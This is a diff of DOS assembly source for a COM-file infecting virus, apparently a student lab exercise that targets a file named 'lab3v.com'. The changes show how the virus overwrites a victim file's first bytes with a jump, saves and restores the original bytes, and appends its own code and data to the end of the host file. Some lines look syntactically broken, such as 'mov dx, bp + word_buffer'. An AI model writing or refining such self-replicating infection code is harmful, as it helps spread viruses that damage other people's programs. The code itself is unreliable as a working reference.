@@ -3,8 +3,8 @@
 org 100h
 start:
 
-    db 0e9h, 1, 0 ; word-pointer jump
-    db 0ffh ; (⌐■_■)
+    ; db 0e9h, 1, 0 ; word-pointer jump
+    ; db 0ffh ; (⌐■_■)
 
 hardcode:
 
@@ -47,6 +47,13 @@ code:
 
 file_err_skip:
 
+    ; reverting first bytes
+    mov bx, 100h
+    mov ax,  leading_bytes[0]
+    mov word ptr[bx], ax
+    mov ax,  leading_bytes[2]
+    mov word ptr[bx], ax
+
     ; moving carret to the end to get the payload offset
     mov cx, 0
     mov dx, 0
@@ -54,6 +61,8 @@ file_err_skip:
     mov ax, 4202h
     int 21h
     mov [bp + payload_offset], ax
+    add ax, 100h
+    mov [bp + victim_bp], ax
 
     ; ; preparing payload addressation
     ; mov al, [bp + payload_offset]
@@ -80,16 +89,23 @@ file_err_skip:
     int 21h
 
     ; inserting load injection
-    mov byte_buffer, 0e9h ; word-pointer jmp
+    mov [bp + byte_buffer], 0e9h ; word-pointer jmp
     lea dx, [bp + byte_buffer]
     mov cx, 1
     mov ah, 40h
     int 21h
     
-    mov ax, [bp + payload_offset] ; jmp offset
-    lea dx, [bp + word_buffer]
-    sub ax, 4 ; jmp command size
+    mov ax, [bp + victim_bp] ; jmp offset
+    add ax, 100h ; com header
     mov [bp + word_buffer], ax
+    lea dx, [bp + word_buffer]
+    mov cx, 2
+    mov ah, 40h
+    int 21h
+    
+    mov [bp + byte_buffer], 0ffh
+    lea dx, [bp + byte_buffer]
+    mov cx, 1
     mov ah, 40h
     int 21h
     
@@ -99,30 +115,36 @@ file_err_skip:
     mov ax, 4202h
     int 21h
 
-    ; writing payload pre_code
-    lea dx, b5_buffer
-    mov cx, 5
+    ; writing payload hardcode
+    mov [bp + byte_buffer], 0bdh
+    lea dx, [bp + byte_buffer]
+    mov cx, 1
     mov ah, 40h
     int 21h
     
-    mov ax, [bp + payload_offset]
-    add ax, offset data - offset code + 107h
-    mov word_buffer, ax
-    lea dx, word_buffer
+    mov ax, [bp + victim_bp]
+    mov [bp + word_buffer], ax
+    mov dx, bp + word_buffer
     mov cx, 2
     mov ah, 40h
     int 21h
 
     ; writing payload code
-    lea dx, code
+    mov dx, bp + code
     add dx, bp
-    lea cx, data
+    mov cx, bp + offset harddata
     sub cx, offset code
     mov ah, 40h
     int 21h
 
+    ; writing payload harddata
+    mov dx, bp + leading_bytes
+    mov cx, 4
+    mov ah, 40h
+    int 21h
+    
     ; writing payload data
-    lea dx, data
+    mov dx, bp + offset data
     lea cx, afterall
     sub cx, offset data
     mov ah, 40h
@@ -166,12 +188,12 @@ data:
     filename Str13 <>
     file DTAFileInfo <>
 
-    b5_buffer db 2eh, 0c7h, 6, 0, 1
     data_local_addr dw ?
     dword_buffer dd ?
     word_buffer dw ?
     byte_buffer db ?
     payload_offset dw ?
+    victim_bp dw ?
     file_mask db 'lab3v.com', 0
     file_err_msg db 'No any file to infect', 13, 10, '$'
 
